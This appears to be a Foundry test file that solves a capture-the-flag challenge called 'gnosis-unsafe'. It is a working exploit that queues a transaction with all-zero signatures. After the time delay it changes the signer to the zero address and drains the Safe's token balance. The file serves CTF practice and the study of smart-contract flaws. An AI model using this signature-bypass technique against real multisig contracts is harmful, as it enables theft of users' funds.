// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Setup as Challenge} from "../../src/gnosis-unsafe/Setup.sol";
import {Safe} from "../../src/gnosis-unsafe/Safe.sol";
import {GREY} from "../../src/gnosis-unsafe/lib/GREY.sol";
import {ISafe} from "../../src/gnosis-unsafe/interfaces/ISafe.sol";

contract SolutionTest is Test {
    Challenge internal challenge;
    Safe internal safe;
    GREY internal grey;

    uint256 internal constant OWNER_COUNT = 3;

    function setUp() public {
        challenge = new Challenge();
        safe = challenge.safe();
        grey = challenge.grey();
    }

    function testExploit() public {
        uint256 timestamp = block.timestamp;

        uint8[OWNER_COUNT] memory v = [uint8(0), uint8(0), uint8(0)];
        bytes32[OWNER_COUNT] memory r = [bytes32(0), bytes32(0), bytes32(0)];
        bytes32[OWNER_COUNT] memory s = [bytes32(0), bytes32(0), bytes32(0)];

        ISafe.Transaction memory transaction = ISafe.Transaction({
            signer: address(0x1337),
            to: address(grey),
            value: 0,
            data: abi.encodeWithSignature("transfer(address,uint256)", address(this), grey.balanceOf(address(safe)))
        });

        safe.queueTransaction(v, r, s, transaction);

        vm.warp(timestamp + 10 minutes);

        transaction.signer = address(0);
        (bool success,) = safe.executeTransaction(v, r, s, transaction, 0);
        assertTrue(success);
        assertTrue(challenge.isSolved());
    }
}
